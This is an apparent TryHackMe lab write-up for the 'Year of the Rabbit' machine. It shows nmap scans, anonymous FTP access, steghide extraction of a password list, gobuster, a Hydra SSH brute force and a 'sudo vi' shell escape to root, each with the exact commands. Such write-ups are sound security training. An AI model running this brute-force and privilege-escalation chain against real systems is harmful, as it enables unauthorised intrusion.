# Year of the Rabbit - TryHackMe

Linux machine combining FTP anonymous access, steganography, SSH brute force, and a sudo misconfiguration. The chain moves through three services: FTP provides an image with hidden credentials, the decoded content feeds an SSH brute force via Hydra, and GTFOBins on `vi` escalates to root.

---

## Enumeration

### Network Scanning

```bash
nmap -p- -Pn 10.65.159.83
nmap -sC -sV -p21,22,80 10.65.159.83
```

Open ports:

- 21/tcp - FTP
- 22/tcp - SSH
- 80/tcp - HTTP

### FTP Enumeration

```bash
ftp 10.65.159.83
# username: anonymous
# password: [blank]
```

Anonymous login succeeded. A `.jpg` image file was present and downloaded:

```bash
ls
get <image>.jpg
bye
```

### Steganography

Standard checks (strings, exiftool) returned nothing actionable. Running `steghide` with a blank passphrase:

```bash
steghide extract -sf <image>.jpg
```

Extracted `b64.txt`:

```bash
cat b64.txt | base64 -d
```

Output: a password list for subsequent brute force.

### Web Enumeration

```bash
gobuster dir -u http://10.65.159.83/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 20
```

Web enumeration confirmed username and supplementary path information.

---

## Initial Access

### SSH Brute Force

Using the password list extracted from the stego step:

```bash
hydra -l <username> -P <passwords.txt> ssh://10.65.159.83
```

Valid credentials recovered. SSH access:

```bash
ssh <user>@10.65.159.83
cat user.txt
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

The user had sudo rights to `/usr/bin/vi`. GTFOBins technique:

```bash
sudo vi -c ':!/bin/sh'
```

Root shell obtained:

```bash
cat /root/root.txt
```

---

## Flags

```
user.txt  -> /home/<user>/user.txt
root.txt  -> /root/root.txt
```

---

## Key Takeaways

- Multi-service targets require enumerating all services before committing to an attack path. FTP anonymous access provided the seed for the entire chain.
- `strings` and `exiftool` are quick checks but steganography can only be confirmed or denied by running `steghide`. Never stop at surface-level file analysis.
- A base64-encoded output from steganography is a common pattern - always pipe through `base64 -d` before evaluating the content.
- Web enumeration is still necessary even when another service provides leads. The web path may hold supplementary information that validates or completes the chain.
- `sudo vi` is an instant GTFOBins escalation. `sudo -l` after gaining any shell is non-negotiable.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
